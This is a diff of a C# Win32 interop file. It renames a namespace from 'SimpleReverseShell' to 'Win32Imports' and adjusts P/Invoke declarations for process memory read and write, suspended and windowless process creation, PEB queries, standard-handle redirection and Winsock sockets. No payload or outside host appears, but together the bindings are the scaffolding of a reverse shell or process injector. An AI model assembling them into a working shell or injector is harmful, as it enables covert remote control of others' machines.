@@ -1,18 +1,15 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Net;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
-
-namespace SimpleReverseShell
+﻿namespace Win32Imports
 {
+  using System.Runtime.InteropServices;
+
   public class DllImportsBase
   {
     #region MemoryManagement
     [DllImport("kernel32.dll")]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
@@ -21,10 +18,10 @@ namespace SimpleReverseShell
     public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
 
     [DllImport("ntdll.dll")]
-    internal static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
 
     [StructLayout(LayoutKind.Sequential)]
-    internal struct PROCESS_BASIC_INFORMATION
+    public struct PROCESS_BASIC_INFORMATION
     {
       public IntPtr ExitStatus;
       public IntPtr PebAddress;
@@ -64,13 +61,21 @@ namespace SimpleReverseShell
       public int dwProcessId;
       public int dwThreadId;
     }
+    
     public static class CreationFlags
     {
       public const uint SUSPENDED = 0x4;
       public const uint CREATE_NO_WINDOW = 0x8000000;
       public const uint STARTF_USESTDHANDLES = 0x100;
-
     }
+
+    public static class StdHandle
+    {
+      public const int STD_INPUT_HANDLE = -10;
+      public const int STD_OUTPUT_HANDLE = -11;
+      public const int STD_ERROR_HANDLE = -12;
+    }
+
     public const int PROCESSBASICINFORMATION = 0;
     #endregion
 
@@ -120,7 +125,7 @@ namespace SimpleReverseShell
     /// <param name="WSAData">Pointer auf die WSAData Struktur.</param>
     /// Doku: https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
     /// <returns></returns>
-    [DllImport("Ws2_32.dll")]
+    [DllImport("Ws2_32.dll", SetLastError = true)]
     public static extern int WSAStartup(ushort maxVersionRequired, WSAData WSAData);
 
     [StructLayout(LayoutKind.Sequential)]
@@ -139,17 +144,12 @@ namespace SimpleReverseShell
     [StructLayout(LayoutKind.Sequential)]
     public struct sockaddr_in
     {
-
-      /// short
       public short sin_family;
 
-      /// u_short->unsigned short
       public ushort sin_port;
 
-      /// in_addr
       public in_addr sin_addr;
 
-      /// char[8]
       [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
       public string sin_zero;
     }
